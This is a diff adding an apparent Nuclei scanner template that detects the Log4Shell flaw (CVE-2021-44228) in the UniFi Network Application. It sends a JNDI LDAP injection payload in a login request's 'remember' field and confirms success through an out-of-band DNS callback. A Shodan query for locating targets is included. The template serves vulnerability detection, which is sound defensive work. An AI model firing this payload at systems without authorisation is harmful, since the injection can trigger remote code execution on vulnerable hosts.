@@ -1,0 +1,67 @@
+http:
+    - extractors:
+        - kval:
+            - interactsh_ip
+          type: kval
+        - group: 2
+          part: interactsh_request
+          regex:
+            - \d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
+          type: regex
+        - group: 1
+          part: interactsh_request
+          regex:
+            - \d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
+          type: regex
+      matchers:
+        - part: interactsh_protocol
+          type: word
+          words:
+            - dns
+        - part: interactsh_request
+          regex:
+            - \d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
+          type: regex
+      matchers-condition: and
+      raw:
+        - |
+          POST /api/login HTTP/1.1
+          Host: {{Hostname}}
+          Content-Type: application/json; charset=utf-8
+          Origin: {{RootURL}}
+          Referer: {{RootURL}}/manage/account/login?redirect=%2Fmanage
+
+          {"username":"user","password":"pass","remember":"${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.postdata.{{interactsh-url}}}","strict":true}
+id: unifi-network-log4j-rce
+info:
+    author: KrE80r
+    classification:
+        cve-id: CVE-2021-44228
+        cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+        cvss-score: 10
+        cwe-id: CWE-77
+    description: |
+        UniFi Network Application is susceptible to a critical vulnerability in Apache Log4j (CVE-2021-44228) that may allow for remote code execution in an impacted implementation.
+    metadata:
+        max-request: 1
+        shodan-query: http.title:"UniFi Network"
+        verified: true
+    name: UniFi Network Application - Remote Code Execution (Apache Log4j)
+    reference:
+        - https://community.ui.com/releases/UniFi-Network-Application-6-5-55/48c64137-4a4a-41f7-b7e4-3bee505ae16e
+        - https://twitter.com/sprocket_ed/status/1473301038832701441
+        - https://logging.apache.org/log4j/2.x/security.html
+        - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
+    severity: critical
+    tags:
+        - log4j
+        - ubnt
+        - unifi
+        - oast
+        - jndi
+        - kev
+        - Logging
+        - UniFi-Network
+variables:
+    rand1: '{{rand_int(111, 999)}}'
+    rand2: '{{rand_int(111, 999)}}'
